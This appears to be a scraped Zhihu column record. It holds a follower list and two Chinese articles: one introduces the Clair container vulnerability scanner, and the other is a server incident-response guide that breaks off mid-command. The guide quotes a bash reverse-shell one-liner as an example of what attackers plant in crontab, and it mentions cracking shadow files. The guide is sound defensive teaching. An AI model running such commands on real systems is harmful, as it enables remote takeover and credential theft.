{
    "title": "从运维安全到DevSecOps", 
    "description": "只要有梦想，op也能成为devsecops", 
    "followers": [
        "https://www.zhihu.com/people/liu-lang-de-tian-zhu-shu", 
        "https://www.zhihu.com/people/xiao-er-81-75-57", 
        "https://www.zhihu.com/people/ying-xiong-star", 
        "https://www.zhihu.com/people/kuang-zhuai-gua-niu", 
        "https://www.zhihu.com/people/iiunknownii", 
        "https://www.zhihu.com/people/wasd-20-22", 
        "https://www.zhihu.com/people/liang-91-91", 
        "https://www.zhihu.com/people/jickfreid", 
        "https://www.zhihu.com/people/lqt-66", 
        "https://www.zhihu.com/people/tonychiang", 
        "https://www.zhihu.com/people/dr-nefario", 
        "https://www.zhihu.com/people/luan-shi-zhu-84", 
        "https://www.zhihu.com/people/zolddouzu", 
        "https://www.zhihu.com/people/wu-lu-mao", 
        "https://www.zhihu.com/people/crisstill", 
        "https://www.zhihu.com/people/mrh-78-91", 
        "https://www.zhihu.com/people/stanley-91-82", 
        "https://www.zhihu.com/people/chen-jun-jie-83-83", 
        "https://www.zhihu.com/people/tian-hong-ru-2", 
        "https://www.zhihu.com/people/mo-fei-23-11", 
        "https://www.zhihu.com/people/lei-79-87", 
        "https://www.zhihu.com/people/li-rui-24-17", 
        "https://www.zhihu.com/people/tyler-1-11", 
        "https://www.zhihu.com/people/huang-bo-pei", 
        "https://www.zhihu.com/people/jackslowfucck", 
        "https://www.zhihu.com/people/1234567-4-82", 
        "https://www.zhihu.com/people/fan-chun-cheng-30", 
        "https://www.zhihu.com/people/cai-zhi-xing-9", 
        "https://www.zhihu.com/people/raoulicy", 
        "https://www.zhihu.com/people/peter-54-50-85", 
        "https://www.zhihu.com/people/yu-xin-hai-5", 
        "https://www.zhihu.com/people/0chencc", 
        "https://www.zhihu.com/people/naiquan", 
        "https://www.zhihu.com/people/zoujifu", 
        "https://www.zhihu.com/people/zhi-shen-da-shi", 
        "https://www.zhihu.com/people/wu-yu-62-1", 
        "https://www.zhihu.com/people/victor-6-64-45", 
        "https://www.zhihu.com/people/pumpkinmage", 
        "https://www.zhihu.com/people/catcherxuefeng", 
        "https://www.zhihu.com/people/hai-zei-wang-85-41", 
        "https://www.zhihu.com/people/louisnie", 
        "https://www.zhihu.com/people/zhang-bin-82-88-87", 
        "https://www.zhihu.com/people/yu-jian-60-61", 
        "https://www.zhihu.com/people/tong-zheng-yang-47", 
        "https://www.zhihu.com/people/zhang-kai-rong-55", 
        "https://www.zhihu.com/people/merryfeng", 
        "https://www.zhihu.com/people/windlx", 
        "https://www.zhihu.com/people/quan-ming-mei", 
        "https://www.zhihu.com/people/le-ba-29", 
        "https://www.zhihu.com/people/wang-ao-80-43", 
        "https://www.zhihu.com/people/drewz", 
        "https://www.zhihu.com/people/lzhkm33", 
        "https://www.zhihu.com/people/an-an-an-36-94", 
        "https://www.zhihu.com/people/shan-yao-de-xin-xiu", 
        "https://www.zhihu.com/people/cnxobo", 
        "https://www.zhihu.com/people/zhao-shuo-97-34", 
        "https://www.zhihu.com/people/fei-zhai-li-88", 
        "https://www.zhihu.com/people/beng-da-xiao-hao", 
        "https://www.zhihu.com/people/frank-93-20-11", 
        "https://www.zhihu.com/people/tupunco", 
        "https://www.zhihu.com/people/gretafu-wu-qi", 
        "https://www.zhihu.com/people/ontheway2015", 
        "https://www.zhihu.com/people/wu-yan-du-shang-xi-lou-90", 
        "https://www.zhihu.com/people/pu-yu-zi-zhuo-live", 
        "https://www.zhihu.com/people/kacakaca", 
        "https://www.zhihu.com/people/leo-36-13", 
        "https://www.zhihu.com/people/dearwu", 
        "https://www.zhihu.com/people/dawnhunter", 
        "https://www.zhihu.com/people/iyux", 
        "https://www.zhihu.com/people/nhyjabc", 
        "https://www.zhihu.com/people/villan", 
        "https://www.zhihu.com/people/yang-xian-88-78", 
        "https://www.zhihu.com/people/cyrusfang", 
        "https://www.zhihu.com/people/Zou.yu", 
        "https://www.zhihu.com/people/yao-jia-miao", 
        "https://www.zhihu.com/people/jie-gou-85", 
        "https://www.zhihu.com/people/m4ster", 
        "https://www.zhihu.com/people/scott-zhang-24", 
        "https://www.zhihu.com/people/mononite", 
        "https://www.zhihu.com/people/huang-hui-bin-79", 
        "https://www.zhihu.com/people/li-shuo-34-53", 
        "https://www.zhihu.com/people/xiao-ke-ai-5-91", 
        "https://www.zhihu.com/people/flaster", 
        "https://www.zhihu.com/people/lu-hai-sheng-94", 
        "https://www.zhihu.com/people/fong-34-17", 
        "https://www.zhihu.com/people/chen-rui-31-53", 
        "https://www.zhihu.com/people/zhong-liang-62-21", 
        "https://www.zhihu.com/people/zyy-3-65", 
        "https://www.zhihu.com/people/jian-feng-19-57", 
        "https://www.zhihu.com/people/vincent-32-76-28", 
        "https://www.zhihu.com/people/wang-er-ma-zi-1", 
        "https://www.zhihu.com/people/vivi-91-91-91", 
        "https://www.zhihu.com/people/wu-jian-42-68", 
        "https://www.zhihu.com/people/rily-89-27", 
        "https://www.zhihu.com/people/codelife-53", 
        "https://www.zhihu.com/people/rshi1973", 
        "https://www.zhihu.com/people/flee-5", 
        "https://www.zhihu.com/people/qingganwan", 
        "https://www.zhihu.com/people/devpos2017", 
        "https://www.zhihu.com/people/lin-zhi-hua-31", 
        "https://www.zhihu.com/people/tai-ji-42-36", 
        "https://www.zhihu.com/people/z00eyzhang", 
        "https://www.zhihu.com/people/xiong-mao-a-san", 
        "https://www.zhihu.com/people/lan-lan-lan-lan-96-82", 
        "https://www.zhihu.com/people/dan-ni-60-5", 
        "https://www.zhihu.com/people/zfjoy520", 
        "https://www.zhihu.com/people/huo-zhao-84-76", 
        "https://www.zhihu.com/people/sundakang", 
        "https://www.zhihu.com/people/li-wen-qi-14-93", 
        "https://www.zhihu.com/people/zhu-jie-ci", 
        "https://www.zhihu.com/people/shi-ta-ke-43", 
        "https://www.zhihu.com/people/wang-hu-10", 
        "https://www.zhihu.com/people/hufox-81", 
        "https://www.zhihu.com/people/SecondaryMarquis", 
        "https://www.zhihu.com/people/Hailie_Ni", 
        "https://www.zhihu.com/people/heizhao", 
        "https://www.zhihu.com/people/knowledgeblah", 
        "https://www.zhihu.com/people/weng-qi-22", 
        "https://www.zhihu.com/people/whirlwind110", 
        "https://www.zhihu.com/people/zi-cheng-purplewall", 
        "https://www.zhihu.com/people/robin-pony", 
        "https://www.zhihu.com/people/alexander-21-56", 
        "https://www.zhihu.com/people/sun-quan-63-73", 
        "https://www.zhihu.com/people/doc-8", 
        "https://www.zhihu.com/people/jade-92-50", 
        "https://www.zhihu.com/people/uou123", 
        "https://www.zhihu.com/people/jing-yu-xian-sheng-32", 
        "https://www.zhihu.com/people/zhu-song-49", 
        "https://www.zhihu.com/people/hong-si-ji", 
        "https://www.zhihu.com/people/an-quan-yi-41", 
        "https://www.zhihu.com/people/mo-wei-31", 
        "https://www.zhihu.com/people/steven-zhou-1995", 
        "https://www.zhihu.com/people/liu-meng-yuan-72-95", 
        "https://www.zhihu.com/people/hx008", 
        "https://www.zhihu.com/people/hu-zhi-zhong-83", 
        "https://www.zhihu.com/people/shenoubang", 
        "https://www.zhihu.com/people/IPPdesu", 
        "https://www.zhihu.com/people/dou-zhong-qiang", 
        "https://www.zhihu.com/people/zhu-bi-wen", 
        "https://www.zhihu.com/people/she-liang", 
        "https://www.zhihu.com/people/zealoussnow", 
        "https://www.zhihu.com/people/yimeng.ch", 
        "https://www.zhihu.com/people/zhang-hao-shui-59", 
        "https://www.zhihu.com/people/luo-ji-yin-85", 
        "https://www.zhihu.com/people/steamedfish", 
        "https://www.zhihu.com/people/lei-zi-hai", 
        "https://www.zhihu.com/people/liu-feng-yi-93", 
        "https://www.zhihu.com/people/Jerusalemsbell", 
        "https://www.zhihu.com/people/ianchen", 
        "https://www.zhihu.com/people/chen-ying-jia", 
        "https://www.zhihu.com/people/huang-yong-chuan", 
        "https://www.zhihu.com/people/qu-shi-qiang-74"
    ], 
    "article": [
        {
            "url": "https://zhuanlan.zhihu.com/p/43547242", 
            "userName": "tuhao", 
            "userLink": "https://www.zhihu.com/people/5353f3263f6ecf860f2db3e773960f09", 
            "upvote": 6, 
            "title": "容器静态安全漏洞扫描工具Clair介绍", 
            "content": "<p>根据绿盟2018年3月的研究显示，目前Docker Hub上的镜像76%都存在漏洞，其研究人员拉取了Docker Hub上公开热门镜像中的前十页镜像，对其使用Docker镜像安全扫描工具Clair进行了CVE扫描统计。结果显示在一百多个镜像中，没有漏洞的只占到24%，包含高危漏洞的占到67%。很多我们经常使用的镜像都包含在其中，如：Httpd,Nginx,Mysql等等。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-33b01020d5efbc6930d9c7f7d2e8f960_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"583\" class=\"origin_image zh-lightbox-thumb\" width=\"875\" data-original=\"https://pic1.zhimg.com/v2-33b01020d5efbc6930d9c7f7d2e8f960_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;875&#39; height=&#39;583&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"583\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"875\" data-original=\"https://pic1.zhimg.com/v2-33b01020d5efbc6930d9c7f7d2e8f960_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-33b01020d5efbc6930d9c7f7d2e8f960_b.jpg\"/></figure><p>本文将介绍这块由CoreOS官方推出的容器静态安全漏洞扫描工具Clair，该工具也被多款docker registry集成，比如VMware中国开源的Harbor（CNCF成员项目）、Quary以及Dockyard等。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-008007c33647637ebaa7a7d1d5cce593_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"100\" class=\"content_image\" width=\"314\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;314&#39; height=&#39;100&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"314\" data-rawheight=\"100\" class=\"content_image lazy\" width=\"314\" data-actualsrc=\"https://pic4.zhimg.com/v2-008007c33647637ebaa7a7d1d5cce593_b.jpg\"/></figure><p>下面将从系统架构、处理流程、落地方式以及使用建议向大家介绍clair，希望能够为容器安全落地提供一种选择。</p><p><b>系统架构</b></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-11bb8a09b2740c00aa5efce775928867_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"579\" data-rawheight=\"362\" class=\"origin_image zh-lightbox-thumb\" width=\"579\" data-original=\"https://pic4.zhimg.com/v2-11bb8a09b2740c00aa5efce775928867_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;579&#39; height=&#39;362&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"579\" data-rawheight=\"362\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"579\" data-original=\"https://pic4.zhimg.com/v2-11bb8a09b2740c00aa5efce775928867_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-11bb8a09b2740c00aa5efce775928867_b.jpg\"/></figure><p>Clair主要包括以下模块：</p><ul><li>获取器（Fetcher）- 从公共源收集漏洞数据</li><li>检测器（Detector）- 指出容器镜像中包含的Feature</li><li>容器格式器（Image Format）- Clair已知的容器镜像格式，包括Docker，ACI</li><li>通知钩子（Notification Hook）- 当新的漏洞被发现时或者已经存在的漏洞发生改变时通知用户/机器</li><li>数据库（Databases）- 存储容器中各个层以及漏洞</li><li>Worker - 每个Post Layer都会启动一个worker进行Layer Detect</li></ul><p><b>工作流程</b></p><p>整体处理流程如下：</p><ul><li>Clair定期从配置的源获取漏洞元数据然后存进数据库。</li><li>客户端使用Clair API处理镜像，获取镜像的特征并存进数据库。</li><li>客户端使用Clair API从数据库查询特定镜像的漏洞情况，为每个请求关联漏洞和特征，避免需要重新扫描镜像。</li><li>当更新漏洞元数据时，将会有系统通知产生。另外，还有webhook用于配置将受影响的镜像记录起来或者拦截其部署。</li></ul><p><b>落地方式</b></p><p>Clair可以直接集成到容器仓库中，以便仓库负责代表用户与Clair进行交互。这种类型的设置避免了手动扫描，并创建了一个合理的接收端以便Clair的漏洞通知到位。仓库还可用于授权，以避免泄露用户不应当访问的镜像漏洞信息。Clair可以集成到CI/CD管道中，如此一来当生成镜像时，将镜像推送到仓库之后触发Clair扫描该镜像的请求。 集成思路如下：</p><ul><li>用户推送镜像到容器仓库，仓库根据设置的黑白名单选择是否调用Clair进行扫描</li><li>一旦触发Clair扫描，则等待扫描结果返回，然后通知用户</li><li>如果发现漏洞，则CI也同时阻止CD流程启动，否则CD流程开启</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-c93840a2802cc558c88461bed3b867fc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"238\" class=\"origin_image zh-lightbox-thumb\" width=\"500\" data-original=\"https://pic1.zhimg.com/v2-c93840a2802cc558c88461bed3b867fc_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;500&#39; height=&#39;238&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"238\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"500\" data-original=\"https://pic1.zhimg.com/v2-c93840a2802cc558c88461bed3b867fc_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-c93840a2802cc558c88461bed3b867fc_b.jpg\"/></figure><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-387e6cf8d855fefeb472ca123509ee2e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"237\" class=\"origin_image zh-lightbox-thumb\" width=\"500\" data-original=\"https://pic3.zhimg.com/v2-387e6cf8d855fefeb472ca123509ee2e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;500&#39; height=&#39;237&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"237\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"500\" data-original=\"https://pic3.zhimg.com/v2-387e6cf8d855fefeb472ca123509ee2e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-387e6cf8d855fefeb472ca123509ee2e_b.jpg\"/></figure><p><b><a href=\"https://link.zhihu.com/?target=https%3A//github.com/coreos/clair/blob/master/Documentation/running-clair.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">部署方式</a></b></p><p>主要有kubernetes和本地部署这两种方式。</p><p>服务端</p><ul><li>k8s cluster</li></ul><div class=\"highlight\"><pre><code class=\"language-text\">git clone https://github.com/coreos/clair\ncd clair/contrib/helm\ncp clair/values.yaml ~/my_custom_values.yaml\nvi ~/my_custom_values.yaml\nhelm dependency update clair\nhelm install clair -f ~/my_custom_values.yaml</code></pre></div><ul><li>local</li></ul><div class=\"highlight\"><pre><code class=\"language-text\">$ mkdir $PWD/clair_config\n$ curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o $PWD/clair_config/config.yaml\n$ docker run -d -e POSTGRES_PASSWORD=&#34;&#34; -p 5432:5432 postgres:9.6\n$ docker run --net=host -d -p 6060-6061:6060-6061 -v $PWD/clair_config:/config quay.io/coreos/clair-git:latest -config=/config/config.yaml</code></pre></div><p>客户端</p><p>上面介绍的只是Clair的服务端，投入应用还需额外的客户端。目前从官方列出的<a href=\"https://link.zhihu.com/?target=https%3A//github.com/coreos/clair/blob/master/Documentation/integrations.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">衍生开发工具</a>里，已经有非常多的选择。</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/jgsqware/clairctl\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">官方客户端clairctl</a>测试效果如下：</li></ul><div class=\"highlight\"><pre><code class=\"language-text\">clairctl analyze -l cve-2017-11610_web\n\nImage: /cve-2017-11610_web:latest\n \n Unknown: 80\n Negligible: 235\n Low: 195\n Medium: 418\n High: 161\n Critical: 0\n Defcon1: 0</code></pre></div><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//app.swaggerhub.com/apis/coreos/clair/3.0\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">clair api 3.0</a>写的不怎么清楚，目前还能在coreos官网上查到<a href=\"https://link.zhihu.com/?target=https%3A//coreos.com/clair/docs/latest/api_v1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">api v1版本的文档</a>，但是对于使用新版已经没意义了，因为改变太大了。</li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/optiopay/klar\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">klar</a>，只支持跟registry集成。</li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/yfoelling/yair\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">yair</a>，只支持跟registry集成，yair是用python写的，可以自己修改。</li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/coreos/analyze-local-images\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">analyze-local-images:命令行，但是被放弃了</a>，只支持clair v1/v2。</li></ul><p>综合来看，clairctl的功能比较丰富，而且社区比较活跃，能保持与clair的及时更新，因此建议选择clairctl，由于其本身使用golang开发，因此也可以根据自己的CI/CD场景做二次开发。</p><p>例如下图：</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-1e10b40f324037cb2eeddeab9b273ccc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb\" width=\"500\" data-original=\"https://pic1.zhimg.com/v2-1e10b40f324037cb2eeddeab9b273ccc_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;500&#39; height=&#39;281&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"500\" data-original=\"https://pic1.zhimg.com/v2-1e10b40f324037cb2eeddeab9b273ccc_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-1e10b40f324037cb2eeddeab9b273ccc_b.jpg\"/></figure><p>下面简单介绍clairctl的安装方式，具体使用方法可参考官方wiki。</p><ul><li>主分支版本</li></ul><blockquote>curl -L <a href=\"https://link.zhihu.com/?target=https%3A//raw.githubusercontent.com/jgsqware/clairctl/master/install.sh\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">raw.githubusercontent.com</span><span class=\"invisible\">/jgsqware/clairctl/master/install.sh</span><span class=\"ellipsis\"></span></a> | sh</blockquote><ul><li>Docker-compose</li></ul><div class=\"highlight\"><pre><code class=\"language-text\">$ git clone git@github.com:jgsqware/clairctl.git $GOPATH/src/github.com/jgsqware/clairctl\n$ cd $GOPATH/src/github.com/jgsqware/clairctl\n$ docker-compose up -d postgres</code></pre></div><p><b>使用建议</b></p><ol><li>master不太稳定，不适合生产环境，建议使用release版本，目前最新版本是<a href=\"https://link.zhihu.com/?target=https%3A//github.com/coreos/clair/tree/release-2.0\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/coreos/clair</span><span class=\"invisible\">/tree/release-2.0</span><span class=\"ellipsis\"></span></a></li><li>由于Clair会根据CVE库扫是Docker镜像使用的内核，但是实际上容器使用的是宿主的内核，这样可能产生大量无用漏洞或者误报，但是根据Clair开发组的意思，他们把决定权交给用户，默认不提供白名单机制，也不对此做区分。</li><li>第一次启动要下载数据到数据库，下载时间根据网络好坏确定。可以用<a href=\"https://link.zhihu.com/?target=https%3A//github.com/arminc/clair-local-scan\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/arminc/clair</span><span class=\"invisible\">-local-scan</span><span class=\"ellipsis\"></span></a>替换clair官方db镜像。</li><li>检测到很多内核漏洞，但实际上可以不处理。但是clair决定不过滤任何东西，而是交给用户决定，这样一来，用户二次开发，增加黑白名单机制在所难免。</li></ol><p><b>参考资料</b></p><p><a href=\"https://link.zhihu.com/?target=https%3A//blog.csdn.net/m0_37552052/article/details/78907296\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Docker安全第一话--镜像安全 - CSDN博客</a> </p><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/coreos/clair\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">coreos/clair</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/jgsqware/clairctl\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">jgsqware/clairctl</a> </p>", 
            "topic": [
                {
                    "tag": "安全漏洞", 
                    "tagLink": "https://api.zhihu.com/topics/19999665"
                }, 
                {
                    "tag": "扫描", 
                    "tagLink": "https://api.zhihu.com/topics/19653287"
                }, 
                {
                    "tag": "Docker", 
                    "tagLink": "https://api.zhihu.com/topics/19950993"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/43457077", 
            "userName": "tuhao", 
            "userLink": "https://www.zhihu.com/people/5353f3263f6ecf860f2db3e773960f09", 
            "upvote": 6, 
            "title": "服务器被入侵了怎么办", 
            "content": "<h2>遇到服务器被黑，很多人会采用拔网线、封iptables或者关掉所有服务的方式应急，但如果是线上服务器就不能立即采用任何影响业务的手段了，需要根据服务器业务情况分类处理。</h2><p>下面我们看一个标准的服务器安全应急影响应该怎么做，也算是笔者从事安全事件应急近5年以来的一些经验之谈，借此抛砖引玉，希望大神们不吝赐教。</p><h2><b>整体思路</b></h2><p>图1将服务器安全应急响应流程分为发现安全事件（核实）、现场保护、服务器保护、影响范围评估、在线分析、数据备份、深入分析、事件报告整理等8个环节。接下来我们将每个环节分解，看看需要如何断开异常连接、排查入侵源头、避免二次入侵等。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-816ec5699b43fc84f53e67998b89e25d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1063\" data-rawheight=\"610\" class=\"origin_image zh-lightbox-thumb\" width=\"1063\" data-original=\"https://pic2.zhimg.com/v2-816ec5699b43fc84f53e67998b89e25d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1063&#39; height=&#39;610&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1063\" data-rawheight=\"610\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1063\" data-original=\"https://pic2.zhimg.com/v2-816ec5699b43fc84f53e67998b89e25d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-816ec5699b43fc84f53e67998b89e25d_b.jpg\"/></figure><h2><b>思路细化</b></h2><h2><b>一、核实信息（运维/安全人员）</b></h2><p>根据安全事件通知源的不同，分为两种：</p><p>1.外界通知：和报告人核实信息，确认服务器/系统是否被入侵。现在很多企业有自己的SRC（安全响应中心），在此之前更多的是依赖某云。这种情况入侵的核实一般是安全工程师完成。</p><p>2.自行发现：根据服务器的异常或故障判断，比如对外发送大规模流量或者系统负载异常高等，这种情况一般是运维工程师发现并核实的。</p><h2><b>二、现场保护（运维）</b></h2><p>我们很多人看过大陆的电视剧《重案六组》，每次接到刑事案件，刑警们第一时间就是封锁现场、保存现场原状。同样道理，安全事件发生现场，跟刑事案件发生现场一样，需要保存第一现场重要信息，方便后面入侵检测和取证。</p><p>1.保存现场环境(截图)</p><p>相关信息采集命令如下：</p><p>进程信息：ps axu</p><p>网络信息：netstat –a</p><p>网络+进程：lsof / netstat -p</p><p>2.攻击者登陆情况(截图)</p><p>相关信息采集命令如下：</p><p>查看当前登录用户：w 或 who -a</p><h2><b>三、服务器保护（运维/机房）</b></h2><p>这里的现场保护和服务器保护是两个不同的环节，前者注重取证，后者注重环境隔离。</p><p>核实机器被入侵后，应当尽快将机器保护起来，避免被二次入侵或者当成跳板扩大攻击面。此时，为保护服务器和业务，避免服务器被攻击者继续利用，应尽快歉意业务，立即下线机器；</p><p>如果不能立即处理，应当通过配置网络ACL等方式，封掉该服务器对网络的双向连接。</p><h2><b>四、影响范围评估（运维/开发）</b></h2><p>一般是运维或者程序确认影响范围，需要运维通过日志或者监控图表确认数据库或者敏感文件是否泄露，如果是代码或者数据库泄露了，则需要程序评估危害情况与处置方法。</p><p>影响访问评估一般从下面几点入手来：</p><p>具体业务架构：web(php/java， webserver)， proxy， db等。</p><p>IP及所处区域拓扑等：VLAN内服务器和应用情况； </p><p>确定同一网络下面服务器之间的访问：可以互相登陆，是否需要key或者是密码登录。</p><p>由此确定检查影响范围，确认所有受到影响的网段和机器</p><h2><b>五、在线分析（安全人员/运维）</b></h2><p>这时需要根据个人经验快速在线分析，一般是安全人员和运维同时在线处理，不过会涉及多人协作的问题，需要避免多人操作机器时破坏服务器现场，造成分析困扰，之前笔者遇到一次类似，就是运维排查时敲错了iptables的命令，将iptables -L敲成iptables -i导致iptables-save时出现异常记录，结果安全人员上来检查时就被这条记录迷惑了，导致处理思路受到一定干扰。</p><p>1.所有用户History日志检测 </p><p>关键字：wget/curl， gcc， 或者隐藏文件， 敏感文件后缀（.c，.py，conf， .pl， .sh)</p><p>检查是否存在异常用户</p><p>检查最近添加的用户，是否有不知名用户或不规范提权</p><p>找出root权限的用户</p><p>可以执行以下命令检查：</p><div class=\"highlight\"><pre><code class=\"language-text\">grep -v -E &#34;^#&#34; /etc/passwd | awk -F： &#39;$3 == 0 { print $1}&#39; </code></pre></div><p>2.反连木马判断</p><p>netstat –a</p><p>注意非正常端口的外网IP；</p><p>3.可疑进程判断</p><p>判断是否为木马 ps –aux</p><p>重点关注文件（隐藏文件）， python脚本，perl脚本，shell脚本（bash/sh/zsh）；</p><p>使用which，whereis，find定位</p><p>4.Crontab检测</p><p>不要用crontab –l查看crontab（绕过检测），也有通过写crontab配置文件反弹shell的，笔者接触过几次，一般都是使用的bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p><p>5.系统日志检测</p><p>检查sshd服务配置文件/etc/ssh/sshd_config和系统认证日志auth、message，判断是否为口令破解攻击</p><p>/etc/ssh/sshd_config文件确认认证方式；</p><p>确认日志是否被删除或者清理过的可能（大小判断）；</p><p>last/lastb可以作为辅助，不过可能不准确；</p><p>6.NHIDS正常运行判断：</p><p>是否安装：ls /etc/ossec</p><p>是否运行正常：ps axu |grep nhids  三个nhids进程则表示正常</p><p>7.其他攻击分析：抓取网络数据包并进行分析 </p><p>判断是否为拒绝服务攻击，这里需要注意，一定要使用-w参数，这样才能保存成pcap格式导入到wireshark，这样分析起来会事半功倍。</p><div class=\"highlight\"><pre><code class=\"language-text\">tcpdump -vvvn -w tcpdump.log</code></pre></div><h2><b>六、安全相关的关键文件和数据备份（运维）</b></h2><p>可以同步进行，使用sftp/rsync等将日志上传到安全的服务器。</p><p>1.打包系统日志</p><div class=\"highlight\"><pre><code class=\"language-text\">参考：$ tar -jcvf syslog.tar.bz2 /var/log</code></pre></div><p>2.打包web日志：access log</p><p>3.打包history日志（所有用户），参考：</p><div class=\"highlight\"><pre><code class=\"language-text\">$ cp /home/user/.history user_history</code></pre></div><p>4.打包crontab记录</p><p>5.打包密码文件：/etc/passwd， /etc/shadow</p><p>6.打包可疑文件、后门、shell信息</p><h2><b>七、深入分析(安全人员)</b></h2><p>初步锁定异常进程和恶意代码后，将受影响范围梳理清楚，封禁了入侵者对机器的控制后，接下来需要深入排查入侵原因。一般可以从webshell、开放端口服务等方向顺藤摸瓜。</p><p>1.Webshell入侵</p><p>1)使用webshell_check.py脚本检测web目录；</p><div class=\"highlight\"><pre><code class=\"language-text\">$ python webshell_check.py /var/www/ &gt;result.txt</code></pre></div><p>2)查找web目录下所有nobody的文件，人工分析：</p><div class=\"highlight\"><pre><code class=\"language-text\">$ find /var/www –user nobody &gt;nobody.txt</code></pre></div><p>3)如果能确定入侵时间，可以使用find查找最近时间段内变化的文件；</p><div class=\"highlight\"><pre><code class=\"language-text\">$ find / -type f -name &#34;\\.?*&#34; |xargs ls -l |grep &#34;Mar 22&#34;\n$ find / -ctime/-mtime 8</code></pre></div><p>2.利用Web漏洞直接反连shell</p><p>分析access.log</p><p>1）缩小日志范围：时间，异常IP提取</p><p>2）攻击行为提取：常见的攻击exp识别</p><p>3.系统弱口令入侵</p><p>认证相关日志auth/syslog/message排查：</p><p> 爆破行为定位和IP提取；</p><p> 爆破是否成功确定：有爆破行为IP是否有accept记录。</p><p>如果日志已经被清理，使用工具（比如John the Ripper）爆破/etc/passwd，/etc/shadow。</p><p>4.其他入侵</p><p>其他服务器跳板到本机</p><p>5.后续行为分析</p><p>History日志：提权、增加后门，以及是否被清理。</p><p>Sniffer： 网卡混杂模式检测  ifconfig |grep –i 